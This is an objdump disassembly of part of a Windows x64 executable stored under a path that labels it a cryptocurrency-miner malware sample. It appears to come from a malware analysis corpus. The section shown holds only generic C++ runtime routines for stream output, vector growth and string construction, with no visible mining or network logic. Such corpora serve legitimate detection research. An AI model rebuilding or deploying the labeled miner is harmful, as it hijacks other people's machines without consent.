
malware_samples/miner/48874fb71017162a8a702a06c2a00c982afe25b860d935bc20ea6c55f4397060.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 8d 0d 69 8b 00 00 	lea    0x8b69(%rip),%rcx        # 0x140009b70
   140001007:	e9 d8 7a 00 00       	jmp    0x140008ae4
   14000100c:	cc                   	int3
   14000100d:	cc                   	int3
   14000100e:	cc                   	int3
   14000100f:	cc                   	int3
   140001010:	48 8d 0d 8a 1f 01 00 	lea    0x11f8a(%rip),%rcx        # 0x140012fa1
   140001017:	e9 a4 23 00 00       	jmp    0x1400033c0
   14000101c:	cc                   	int3
   14000101d:	cc                   	int3
   14000101e:	cc                   	int3
   14000101f:	cc                   	int3
   140001020:	48 8d 0d 59 8b 00 00 	lea    0x8b59(%rip),%rcx        # 0x140009b80
   140001027:	e9 b8 7a 00 00       	jmp    0x140008ae4
   14000102c:	cc                   	int3
   14000102d:	cc                   	int3
   14000102e:	cc                   	int3
   14000102f:	cc                   	int3
   140001030:	48 8d 0d e9 8b 00 00 	lea    0x8be9(%rip),%rcx        # 0x140009c20
   140001037:	e9 a8 7a 00 00       	jmp    0x140008ae4
   14000103c:	48 8d 0d 7d 8c 00 00 	lea    0x8c7d(%rip),%rcx        # 0x140009cc0
   140001043:	e9 9c 7a 00 00       	jmp    0x140008ae4
   140001048:	cc                   	int3
   140001049:	cc                   	int3
   14000104a:	cc                   	int3
   14000104b:	cc                   	int3
   14000104c:	cc                   	int3
   14000104d:	cc                   	int3
   14000104e:	cc                   	int3
   14000104f:	cc                   	int3
   140001050:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001055:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000105a:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000105f:	57                   	push   %rdi
   140001060:	41 54                	push   %r12
   140001062:	41 55                	push   %r13
   140001064:	41 56                	push   %r14
   140001066:	41 57                	push   %r15
   140001068:	48 83 ec 30          	sub    $0x30,%rsp
   14000106c:	4c 8b ea             	mov    %rdx,%r13
   14000106f:	48 8b f9             	mov    %rcx,%rdi
   140001072:	45 33 f6             	xor    %r14d,%r14d
   140001075:	44 89 74 24 70       	mov    %r14d,0x70(%rsp)
   14000107a:	48 8b ca             	mov    %rdx,%rcx
   14000107d:	e8 e6 85 00 00       	call   0x140009668
   140001082:	4c 8b e0             	mov    %rax,%r12
   140001085:	4c 8b 07             	mov    (%rdi),%r8
   140001088:	49 63 48 04          	movslq 0x4(%r8),%rcx
   14000108c:	48 03 cf             	add    %rdi,%rcx
   14000108f:	ff 15 43 92 00 00    	call   *0x9243(%rip)        # 0x14000a2d8
   140001095:	48 85 c0             	test   %rax,%rax
   140001098:	7e 2d                	jle    0x1400010c7
   14000109a:	48 8b 0f             	mov    (%rdi),%rcx
   14000109d:	48 63 49 04          	movslq 0x4(%rcx),%rcx
   1400010a1:	48 03 cf             	add    %rdi,%rcx
   1400010a4:	ff 15 2e 92 00 00    	call   *0x922e(%rip)        # 0x14000a2d8
   1400010aa:	49 3b c4             	cmp    %r12,%rax
   1400010ad:	7e 18                	jle    0x1400010c7
   1400010af:	48 8b 07             	mov    (%rdi),%rax
   1400010b2:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400010b6:	48 03 cf             	add    %rdi,%rcx
   1400010b9:	ff 15 19 92 00 00    	call   *0x9219(%rip)        # 0x14000a2d8
   1400010bf:	48 8b f0             	mov    %rax,%rsi
   1400010c2:	49 2b f4             	sub    %r12,%rsi
   1400010c5:	eb 03                	jmp    0x1400010ca
   1400010c7:	49 8b f6             	mov    %r14,%rsi
   1400010ca:	4c 8b ff             	mov    %rdi,%r15
   1400010cd:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400010d2:	48 8b 07             	mov    (%rdi),%rax
   1400010d5:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400010d9:	48 03 cf             	add    %rdi,%rcx
   1400010dc:	ff 15 26 92 00 00    	call   *0x9226(%rip)        # 0x14000a308
   1400010e2:	48 85 c0             	test   %rax,%rax
   1400010e5:	74 0d                	je     0x1400010f4
   1400010e7:	48 8b 08             	mov    (%rax),%rcx
   1400010ea:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   1400010ee:	48 8b c8             	mov    %rax,%rcx
   1400010f1:	ff d2                	call   *%rdx
   1400010f3:	90                   	nop
   1400010f4:	48 8b 07             	mov    (%rdi),%rax
   1400010f7:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400010fb:	48 03 cf             	add    %rdi,%rcx
   1400010fe:	ff 15 ec 91 00 00    	call   *0x91ec(%rip)        # 0x14000a2f0
   140001104:	84 c0                	test   %al,%al
   140001106:	75 06                	jne    0x14000110e
   140001108:	88 44 24 28          	mov    %al,0x28(%rsp)
   14000110c:	eb 40                	jmp    0x14000114e
   14000110e:	48 8b 07             	mov    (%rdi),%rax
   140001111:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140001115:	48 03 cf             	add    %rdi,%rcx
   140001118:	ff 15 82 91 00 00    	call   *0x9182(%rip)        # 0x14000a2a0
   14000111e:	48 85 c0             	test   %rax,%rax
   140001121:	74 24                	je     0x140001147
   140001123:	48 3b c7             	cmp    %rdi,%rax
   140001126:	74 1f                	je     0x140001147
   140001128:	48 8b c8             	mov    %rax,%rcx
   14000112b:	ff 15 b7 8f 00 00    	call   *0x8fb7(%rip)        # 0x14000a0e8
   140001131:	48 8b 07             	mov    (%rdi),%rax
   140001134:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140001138:	48 03 cf             	add    %rdi,%rcx
   14000113b:	ff 15 af 91 00 00    	call   *0x91af(%rip)        # 0x14000a2f0
   140001141:	88 44 24 28          	mov    %al,0x28(%rsp)
   140001145:	eb 07                	jmp    0x14000114e
   140001147:	c6 44 24 28 01       	movb   $0x1,0x28(%rsp)
   14000114c:	b0 01                	mov    $0x1,%al
   14000114e:	84 c0                	test   %al,%al
   140001150:	75 0b                	jne    0x14000115d
   140001152:	41 be 04 00 00 00    	mov    $0x4,%r14d
   140001158:	e9 f0 00 00 00       	jmp    0x14000124d
   14000115d:	48 8b 07             	mov    (%rdi),%rax
   140001160:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140001164:	48 03 cf             	add    %rdi,%rcx
   140001167:	ff 15 7b 91 00 00    	call   *0x917b(%rip)        # 0x14000a2e8
   14000116d:	25 c0 01 00 00       	and    $0x1c0,%eax
   140001172:	83 f8 40             	cmp    $0x40,%eax
   140001175:	74 3e                	je     0x1400011b5
   140001177:	48 85 f6             	test   %rsi,%rsi
   14000117a:	7e 39                	jle    0x1400011b5
   14000117c:	48 8b 07             	mov    (%rdi),%rax
   14000117f:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140001183:	48 03 cf             	add    %rdi,%rcx
   140001186:	ff 15 7c 91 00 00    	call   *0x917c(%rip)        # 0x14000a308
   14000118c:	48 8b d8             	mov    %rax,%rbx
   14000118f:	48 8b 0f             	mov    (%rdi),%rcx
   140001192:	48 63 49 04          	movslq 0x4(%rcx),%rcx
   140001196:	48 03 cf             	add    %rdi,%rcx
   140001199:	ff 15 19 91 00 00    	call   *0x9119(%rip)        # 0x14000a2b8
   14000119f:	0f b6 d0             	movzbl %al,%edx
   1400011a2:	48 8b cb             	mov    %rbx,%rcx
   1400011a5:	ff 15 15 91 00 00    	call   *0x9115(%rip)        # 0x14000a2c0
   1400011ab:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400011ae:	74 6e                	je     0x14000121e
   1400011b0:	48 ff ce             	dec    %rsi
   1400011b3:	eb c2                	jmp    0x140001177
   1400011b5:	48 8b 07             	mov    (%rdi),%rax
   1400011b8:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400011bc:	48 03 cf             	add    %rdi,%rcx
   1400011bf:	ff 15 43 91 00 00    	call   *0x9143(%rip)        # 0x14000a308
   1400011c5:	4d 8b c4             	mov    %r12,%r8
   1400011c8:	49 8b d5             	mov    %r13,%rdx
   1400011cb:	48 8b c8             	mov    %rax,%rcx
   1400011ce:	ff 15 dc 90 00 00    	call   *0x90dc(%rip)        # 0x14000a2b0
   1400011d4:	49 3b c4             	cmp    %r12,%rax
   1400011d7:	75 45                	jne    0x14000121e
   1400011d9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400011e0:	48 85 f6             	test   %rsi,%rsi
   1400011e3:	7e 44                	jle    0x140001229
   1400011e5:	48 8b 07             	mov    (%rdi),%rax
   1400011e8:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400011ec:	48 03 cf             	add    %rdi,%rcx
   1400011ef:	ff 15 13 91 00 00    	call   *0x9113(%rip)        # 0x14000a308
   1400011f5:	48 8b d8             	mov    %rax,%rbx
   1400011f8:	48 8b 0f             	mov    (%rdi),%rcx
   1400011fb:	48 63 49 04          	movslq 0x4(%rcx),%rcx
   1400011ff:	48 03 cf             	add    %rdi,%rcx
   140001202:	ff 15 b0 90 00 00    	call   *0x90b0(%rip)        # 0x14000a2b8
   140001208:	0f b6 d0             	movzbl %al,%edx
   14000120b:	48 8b cb             	mov    %rbx,%rcx
   14000120e:	ff 15 ac 90 00 00    	call   *0x90ac(%rip)        # 0x14000a2c0
   140001214:	83 f8 ff             	cmp    $0xffffffff,%eax
   140001217:	74 05                	je     0x14000121e
   140001219:	48 ff ce             	dec    %rsi
   14000121c:	eb c2                	jmp    0x1400011e0
   14000121e:	41 be 04 00 00 00    	mov    $0x4,%r14d
   140001224:	44 89 74 24 70       	mov    %r14d,0x70(%rsp)
   140001229:	48 8b 07             	mov    (%rdi),%rax
   14000122c:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140001230:	48 03 cf             	add    %rdi,%rcx
   140001233:	33 d2                	xor    %edx,%edx
   140001235:	ff 15 95 90 00 00    	call   *0x9095(%rip)        # 0x14000a2d0
   14000123b:	90                   	nop
   14000123c:	eb 0f                	jmp    0x14000124d
   14000123e:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   140001243:	44 8b 74 24 70       	mov    0x70(%rsp),%r14d
   140001248:	4c 8b 7c 24 20       	mov    0x20(%rsp),%r15
   14000124d:	48 8b 07             	mov    (%rdi),%rax
   140001250:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140001254:	48 03 cf             	add    %rdi,%rcx
   140001257:	45 33 c0             	xor    %r8d,%r8d
   14000125a:	41 8b d6             	mov    %r14d,%edx
   14000125d:	ff 15 45 90 00 00    	call   *0x9045(%rip)        # 0x14000a2a8
   140001263:	90                   	nop
   140001264:	e8 96 74 00 00       	call   0x1400086ff
   140001269:	84 c0                	test   %al,%al
   14000126b:	75 0a                	jne    0x140001277
   14000126d:	49 8b cf             	mov    %r15,%rcx
   140001270:	ff 15 52 90 00 00    	call   *0x9052(%rip)        # 0x14000a2c8
   140001276:	90                   	nop
   140001277:	49 8b 07             	mov    (%r15),%rax
   14000127a:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000127e:	49 03 cf             	add    %r15,%rcx
   140001281:	ff 15 81 90 00 00    	call   *0x9081(%rip)        # 0x14000a308
   140001287:	48 85 c0             	test   %rax,%rax
   14000128a:	74 0d                	je     0x140001299
   14000128c:	48 8b 08             	mov    (%rax),%rcx
   14000128f:	48 8b 51 10          	mov    0x10(%rcx),%rdx
   140001293:	48 8b c8             	mov    %rax,%rcx
   140001296:	ff d2                	call   *%rdx
   140001298:	90                   	nop
   140001299:	48 8b c7             	mov    %rdi,%rax
   14000129c:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   1400012a1:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   1400012a6:	48 83 c4 30          	add    $0x30,%rsp
   1400012aa:	41 5f                	pop    %r15
   1400012ac:	41 5e                	pop    %r14
   1400012ae:	41 5d                	pop    %r13
   1400012b0:	41 5c                	pop    %r12
   1400012b2:	5f                   	pop    %rdi
   1400012b3:	c3                   	ret
   1400012b4:	cc                   	int3
   1400012b5:	cc                   	int3
   1400012b6:	cc                   	int3
   1400012b7:	cc                   	int3
   1400012b8:	cc                   	int3
   1400012b9:	cc                   	int3
   1400012ba:	cc                   	int3
   1400012bb:	cc                   	int3
   1400012bc:	cc                   	int3
   1400012bd:	cc                   	int3
   1400012be:	cc                   	int3
   1400012bf:	cc                   	int3
   1400012c0:	48 83 ec 38          	sub    $0x38,%rsp
   1400012c4:	48 85 c9             	test   %rcx,%rcx
   1400012c7:	75 07                	jne    0x1400012d0
   1400012c9:	33 c0                	xor    %eax,%eax
   1400012cb:	48 83 c4 38          	add    $0x38,%rsp
   1400012cf:	c3                   	ret
   1400012d0:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   1400012d7:	72 3e                	jb     0x140001317
   1400012d9:	48 8d 41 27          	lea    0x27(%rcx),%rax
   1400012dd:	48 3b c1             	cmp    %rcx,%rax
   1400012e0:	76 3e                	jbe    0x140001320
   1400012e2:	48 8b c8             	mov    %rax,%rcx
   1400012e5:	e8 b2 74 00 00       	call   0x14000879c
   1400012ea:	48 8b c8             	mov    %rax,%rcx
   1400012ed:	48 85 c0             	test   %rax,%rax
   1400012f0:	75 14                	jne    0x140001306
   1400012f2:	45 33 c9             	xor    %r9d,%r9d
   1400012f5:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400012fa:	45 33 c0             	xor    %r8d,%r8d
   1400012fd:	33 d2                	xor    %edx,%edx
   1400012ff:	ff 15 63 91 00 00    	call   *0x9163(%rip)        # 0x14000a468
   140001305:	cc                   	int3
   140001306:	48 83 c0 27          	add    $0x27,%rax
   14000130a:	48 83 e0 e0          	and    $0xffffffffffffffe0,%rax
   14000130e:	48 89 48 f8          	mov    %rcx,-0x8(%rax)
   140001312:	48 83 c4 38          	add    $0x38,%rsp
   140001316:	c3                   	ret
   140001317:	48 83 c4 38          	add    $0x38,%rsp
   14000131b:	e9 7c 74 00 00       	jmp    0x14000879c
   140001320:	e8 3b 09 00 00       	call   0x140001c60
   140001325:	cc                   	int3
   140001326:	cc                   	int3
   140001327:	cc                   	int3
   140001328:	cc                   	int3
   140001329:	cc                   	int3
   14000132a:	cc                   	int3
   14000132b:	cc                   	int3
   14000132c:	cc                   	int3
   14000132d:	cc                   	int3
   14000132e:	cc                   	int3
   14000132f:	cc                   	int3
   140001330:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001335:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000133a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000133f:	57                   	push   %rdi
   140001340:	41 56                	push   %r14
   140001342:	41 57                	push   %r15
   140001344:	48 83 ec 20          	sub    $0x20,%rsp
   140001348:	48 8b 39             	mov    (%rcx),%rdi
   14000134b:	48 8b ea             	mov    %rdx,%rbp
   14000134e:	4c 8b 49 10          	mov    0x10(%rcx),%r9
   140001352:	4d 8b f0             	mov    %r8,%r14
   140001355:	4c 2b cf             	sub    %rdi,%r9
   140001358:	49 b8 ab aa aa aa aa 	movabs $0x2aaaaaaaaaaaaaab,%r8
   14000135f:	aa aa 2a 
   140001362:	49 8b c0             	mov    %r8,%rax
   140001365:	4c 8b f9             	mov    %rcx,%r15
   140001368:	49 f7 e9             	imul   %r9
   14000136b:	48 c1 fa 02          	sar    $0x2,%rdx
   14000136f:	48 8b c2             	mov    %rdx,%rax
   140001372:	48 c1 e8 3f          	shr    $0x3f,%rax
   140001376:	48 03 d0             	add    %rax,%rdx
   140001379:	4c 3b f2             	cmp    %rdx,%r14
   14000137c:	0f 86 bd 00 00 00    	jbe    0x14000143f
   140001382:	48 be aa aa aa aa aa 	movabs $0xaaaaaaaaaaaaaaa,%rsi
   140001389:	aa aa 0a 
   14000138c:	4c 3b f6             	cmp    %rsi,%r14
   14000138f:	0f 87 fd 00 00 00    	ja     0x140001492
   140001395:	48 8b ca             	mov    %rdx,%rcx
   140001398:	48 8b c6             	mov    %rsi,%rax
   14000139b:	48 d1 e9             	shr    $1,%rcx
   14000139e:	48 2b c1             	sub    %rcx,%rax
   1400013a1:	48 3b d0             	cmp    %rax,%rdx
   1400013a4:	76 05                	jbe    0x1400013ab
   1400013a6:	48 8b de             	mov    %rsi,%rbx
   1400013a9:	eb 0b                	jmp    0x1400013b6
   1400013ab:	48 8d 1c 0a          	lea    (%rdx,%rcx,1),%rbx
   1400013af:	49 3b de             	cmp    %r14,%rbx
   1400013b2:	49 0f 42 de          	cmovb  %r14,%rbx
   1400013b6:	48 85 ff             	test   %rdi,%rdi
   1400013b9:	74 1b                	je     0x1400013d6
   1400013bb:	4c 8b c2             	mov    %rdx,%r8
   1400013be:	49 8b cf             	mov    %r15,%rcx
   1400013c1:	48 8b d7             	mov    %rdi,%rdx
   1400013c4:	e8 f7 0a 00 00       	call   0x140001ec0
   1400013c9:	33 c0                	xor    %eax,%eax
   1400013cb:	49 89 07             	mov    %rax,(%r15)
   1400013ce:	49 89 47 08          	mov    %rax,0x8(%r15)
   1400013d2:	49 89 47 10          	mov    %rax,0x10(%r15)
   1400013d6:	48 3b de             	cmp    %rsi,%rbx
   1400013d9:	0f 87 ad 00 00 00    	ja     0x14000148c
   1400013df:	48 8d 04 5b          	lea    (%rbx,%rbx,2),%rax
   1400013e3:	48 8d 1c c5 00 00 00 	lea    0x0(,%rax,8),%rbx
   1400013ea:	00 
   1400013eb:	48 8b cb             	mov    %rbx,%rcx
   1400013ee:	e8 cd fe ff ff       	call   0x1400012c0
   1400013f3:	49 89 07             	mov    %rax,(%r15)
   1400013f6:	48 8b f8             	mov    %rax,%rdi
   1400013f9:	49 89 47 08          	mov    %rax,0x8(%r15)
   1400013fd:	48 03 c3             	add    %rbx,%rax
   140001400:	49 89 47 10          	mov    %rax,0x10(%r15)
   140001404:	48 8b d5             	mov    %rbp,%rdx
   140001407:	4b 8d 04 76          	lea    (%r14,%r14,2),%rax
   14000140b:	48 8b cf             	mov    %rdi,%rcx
   14000140e:	48 8d 1c c5 00 00 00 	lea    0x0(,%rax,8),%rbx
   140001415:	00 
   140001416:	4c 8b c3             	mov    %rbx,%r8
   140001419:	e8 2c 82 00 00       	call   0x14000964a
   14000141e:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140001423:	48 8d 04 3b          	lea    (%rbx,%rdi,1),%rax
   140001427:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000142c:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140001431:	49 89 47 08          	mov    %rax,0x8(%r15)
   140001435:	48 83 c4 20          	add    $0x20,%rsp
   140001439:	41 5f                	pop    %r15
   14000143b:	41 5e                	pop    %r14
   14000143d:	5f                   	pop    %rdi
   14000143e:	c3                   	ret
   14000143f:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140001443:	49 8b c0             	mov    %r8,%rax
   140001446:	48 2b cf             	sub    %rdi,%rcx
   140001449:	48 f7 e9             	imul   %rcx
   14000144c:	48 8b da             	mov    %rdx,%rbx
   14000144f:	48 c1 fb 02          	sar    $0x2,%rbx
   140001453:	48 8b c3             	mov    %rbx,%rax
   140001456:	48 c1 e8 3f          	shr    $0x3f,%rax
   14000145a:	48 03 d8             	add    %rax,%rbx
   14000145d:	4c 3b f3             	cmp    %rbx,%r14
   140001460:	76 a2                	jbe    0x140001404
   140001462:	48 8d 04 5b          	lea    (%rbx,%rbx,2),%rax
   140001466:	48 8b d5             	mov    %rbp,%rdx
   140001469:	48 8d 34 c5 00 00 00 	lea    0x0(,%rax,8),%rsi
   140001470:	00 
   140001471:	48 8b cf             	mov    %rdi,%rcx
   140001474:	4c 8b c6             	mov    %rsi,%r8
   140001477:	e8 ce 81 00 00       	call   0x14000964a
   14000147c:	49 8b 7f 08          	mov    0x8(%r15),%rdi
   140001480:	48 8d 14 2e          	lea    (%rsi,%rbp,1),%rdx
   140001484:	4c 2b f3             	sub    %rbx,%r14
   140001487:	e9 7b ff ff ff       	jmp    0x140001407
   14000148c:	e8 cf 07 00 00       	call   0x140001c60
   140001491:	cc                   	int3
   140001492:	e8 89 08 00 00       	call   0x140001d20
   140001497:	cc                   	int3
   140001498:	cc                   	int3
   140001499:	cc                   	int3
   14000149a:	cc                   	int3
   14000149b:	cc                   	int3
   14000149c:	cc                   	int3
   14000149d:	cc                   	int3
   14000149e:	cc                   	int3
   14000149f:	cc                   	int3
   1400014a0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400014a5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400014aa:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400014af:	57                   	push   %rdi
   1400014b0:	41 56                	push   %r14
   1400014b2:	41 57                	push   %r15
   1400014b4:	48 83 ec 20          	sub    $0x20,%rsp
   1400014b8:	48 8b 39             	mov    (%rcx),%rdi
   1400014bb:	48 8b ea             	mov    %rdx,%rbp
   1400014be:	4c 8b 49 10          	mov    0x10(%rcx),%r9
   1400014c2:	4d 8b f0             	mov    %r8,%r14
   1400014c5:	4c 2b cf             	sub    %rdi,%r9
   1400014c8:	49 b8 67 66 66 66 66 	movabs $0x6666666666666667,%r8
   1400014cf:	66 66 66 
   1400014d2:	49 8b c0             	mov    %r8,%rax
   1400014d5:	4c 8b f9             	mov    %rcx,%r15
   1400014d8:	49 f7 e9             	imul   %r9
   1400014db:	48 c1 fa 04          	sar    $0x4,%rdx
   1400014df:	48 8b c2             	mov    %rdx,%rax
   1400014e2:	48 c1 e8 3f          	shr    $0x3f,%rax
   1400014e6:	48 03 d0             	add    %rax,%rdx
   1400014e9:	4c 3b f2             	cmp    %rdx,%r14
   1400014ec:	0f 86 bd 00 00 00    	jbe    0x1400015af
   1400014f2:	48 be 66 66 66 66 66 	movabs $0x666666666666666,%rsi
   1400014f9:	66 66 06 
   1400014fc:	4c 3b f6             	cmp    %rsi,%r14
   1400014ff:	0f 87 fd 00 00 00    	ja     0x140001602
   140001505:	48 8b ca             	mov    %rdx,%rcx
   140001508:	48 8b c6             	mov    %rsi,%rax
   14000150b:	48 d1 e9             	shr    $1,%rcx
   14000150e:	48 2b c1             	sub    %rcx,%rax
   140001511:	48 3b d0             	cmp    %rax,%rdx
   140001514:	76 05                	jbe    0x14000151b
   140001516:	48 8b de             	mov    %rsi,%rbx
   140001519:	eb 0b                	jmp    0x140001526
   14000151b:	48 8d 1c 0a          	lea    (%rdx,%rcx,1),%rbx
   14000151f:	49 3b de             	cmp    %r14,%rbx
   140001522:	49 0f 42 de          	cmovb  %r14,%rbx
   140001526:	48 85 ff             	test   %rdi,%rdi
   140001529:	74 1b                	je     0x140001546
   14000152b:	4c 8b c2             	mov    %rdx,%r8
   14000152e:	49 8b cf             	mov    %r15,%rcx
   140001531:	48 8b d7             	mov    %rdi,%rdx
   140001534:	e8 e7 09 00 00       	call   0x140001f20
   140001539:	33 c0                	xor    %eax,%eax
   14000153b:	49 89 07             	mov    %rax,(%r15)
   14000153e:	49 89 47 08          	mov    %rax,0x8(%r15)
   140001542:	49 89 47 10          	mov    %rax,0x10(%r15)
   140001546:	48 3b de             	cmp    %rsi,%rbx
   140001549:	0f 87 ad 00 00 00    	ja     0x1400015fc
   14000154f:	48 8d 04 9b          	lea    (%rbx,%rbx,4),%rax
   140001553:	48 8d 1c c5 00 00 00 	lea    0x0(,%rax,8),%rbx
   14000155a:	00 
   14000155b:	48 8b cb             	mov    %rbx,%rcx
   14000155e:	e8 5d fd ff ff       	call   0x1400012c0
   140001563:	49 89 07             	mov    %rax,(%r15)
   140001566:	48 8b f8             	mov    %rax,%rdi
   140001569:	49 89 47 08          	mov    %rax,0x8(%r15)
   14000156d:	48 03 c3             	add    %rbx,%rax
   140001570:	49 89 47 10          	mov    %rax,0x10(%r15)
   140001574:	48 8b d5             	mov    %rbp,%rdx
   140001577:	4b 8d 04 b6          	lea    (%r14,%r14,4),%rax
   14000157b:	48 8b cf             	mov    %rdi,%rcx
   14000157e:	48 8d 1c c5 00 00 00 	lea    0x0(,%rax,8),%rbx
   140001585:	00 
   140001586:	4c 8b c3             	mov    %rbx,%r8
   140001589:	e8 bc 80 00 00       	call   0x14000964a
   14000158e:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140001593:	48 8d 04 3b          	lea    (%rbx,%rdi,1),%rax
   140001597:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000159c:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   1400015a1:	49 89 47 08          	mov    %rax,0x8(%r15)
   1400015a5:	48 83 c4 20          	add    $0x20,%rsp
   1400015a9:	41 5f                	pop    %r15
   1400015ab:	41 5e                	pop    %r14
   1400015ad:	5f                   	pop    %rdi
   1400015ae:	c3                   	ret
   1400015af:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   1400015b3:	49 8b c0             	mov    %r8,%rax
   1400015b6:	48 2b cf             	sub    %rdi,%rcx
   1400015b9:	48 f7 e9             	imul   %rcx
   1400015bc:	48 8b da             	mov    %rdx,%rbx
   1400015bf:	48 c1 fb 04          	sar    $0x4,%rbx
   1400015c3:	48 8b c3             	mov    %rbx,%rax
   1400015c6:	48 c1 e8 3f          	shr    $0x3f,%rax
   1400015ca:	48 03 d8             	add    %rax,%rbx
   1400015cd:	4c 3b f3             	cmp    %rbx,%r14
   1400015d0:	76 a2                	jbe    0x140001574
   1400015d2:	48 8d 04 9b          	lea    (%rbx,%rbx,4),%rax
   1400015d6:	48 8b d5             	mov    %rbp,%rdx
   1400015d9:	48 8d 34 c5 00 00 00 	lea    0x0(,%rax,8),%rsi
   1400015e0:	00 
   1400015e1:	48 8b cf             	mov    %rdi,%rcx
   1400015e4:	4c 8b c6             	mov    %rsi,%r8
   1400015e7:	e8 5e 80 00 00       	call   0x14000964a
   1400015ec:	49 8b 7f 08          	mov    0x8(%r15),%rdi
   1400015f0:	48 8d 14 2e          	lea    (%rsi,%rbp,1),%rdx
   1400015f4:	4c 2b f3             	sub    %rbx,%r14
   1400015f7:	e9 7b ff ff ff       	jmp    0x140001577
   1400015fc:	e8 5f 06 00 00       	call   0x140001c60
   140001601:	cc                   	int3
   140001602:	e8 19 07 00 00       	call   0x140001d20
   140001607:	cc                   	int3
   140001608:	cc                   	int3
   140001609:	cc                   	int3
   14000160a:	cc                   	int3
   14000160b:	cc                   	int3
   14000160c:	cc                   	int3
   14000160d:	cc                   	int3
   14000160e:	cc                   	int3
   14000160f:	cc                   	int3
   140001610:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140001615:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000161a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000161f:	41 56                	push   %r14
   140001621:	48 83 ec 20          	sub    $0x20,%rsp
   140001625:	48 bd ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbp
   14000162c:	ff ff 7f 
   14000162f:	49 8b f8             	mov    %r8,%rdi
   140001632:	4c 8b f2             	mov    %rdx,%r14
   140001635:	48 8b f1             	mov    %rcx,%rsi
   140001638:	4c 3b c5             	cmp    %rbp,%r8
   14000163b:	0f 87 81 00 00 00    	ja     0x1400016c2
   140001641:	49 83 f8 0f          	cmp    $0xf,%r8
   140001645:	77 17                	ja     0x14000165e
   140001647:	4c 89 41 10          	mov    %r8,0x10(%rcx)
   14000164b:	48 c7 41 18 0f 00 00 	movq   $0xf,0x18(%rcx)
   140001652:	00 
   140001653:	e8 ec 7f 00 00       	call   0x140009644
   140001658:	c6 04 37 00          	movb   $0x0,(%rdi,%rsi,1)
   14000165c:	eb 4e                	jmp    0x1400016ac
   14000165e:	48 8b c7             	mov    %rdi,%rax
   140001661:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140001666:	48 83 c8 0f          	or     $0xf,%rax
   14000166a:	48 3b c5             	cmp    %rbp,%rax
   14000166d:	77 0f                	ja     0x14000167e
   14000166f:	b9 16 00 00 00       	mov    $0x16,%ecx
   140001674:	48 8b e8             	mov    %rax,%rbp
   140001677:	48 3b c1             	cmp    %rcx,%rax
   14000167a:	48 0f 42 e9          	cmovb  %rcx,%rbp
   14000167e:	48 8d 4d 01          	lea    0x1(%rbp),%rcx
   140001682:	e8 39 fc ff ff       	call   0x1400012c0
   140001687:	4c 8b c7             	mov    %rdi,%r8
   14000168a:	48 89 06             	mov    %rax,(%rsi)
   14000168d:	49 8b d6             	mov    %r14,%rdx
   140001690:	48 89 7e 10          	mov    %rdi,0x10(%rsi)
   140001694:	48 8b c8             	mov    %rax,%rcx
   140001697:	48 89 6e 18          	mov    %rbp,0x18(%rsi)
   14000169b:	48 8b d8             	mov    %rax,%rbx
   14000169e:	e8 a1 7f 00 00       	call   0x140009644
   1400016a3:	c6 04 3b 00          	movb   $0x0,(%rbx,%rdi,1)
   1400016a7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400016ac:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400016b1:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400016b6:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   1400016bb:	48 83 c4 20          	add    $0x20,%rsp
   1400016bf:	41 5e                	pop    %r14
   1400016c1:	c3                   	ret
   1400016c2:	e8 39 06 00 00       	call   0x140001d00
   1400016c7:	cc                   	int3
   1400016c8:	cc                   	int3
   1400016c9:	cc                   	int3
   1400016ca:	cc                   	int3
   1400016cb:	cc                   	int3
   1400016cc:	cc                   	int3
   1400016cd:	cc                   	int3
   1400016ce:	cc                   	int3
   1400016cf:	cc                   	int3
   1400016d0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400016d5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
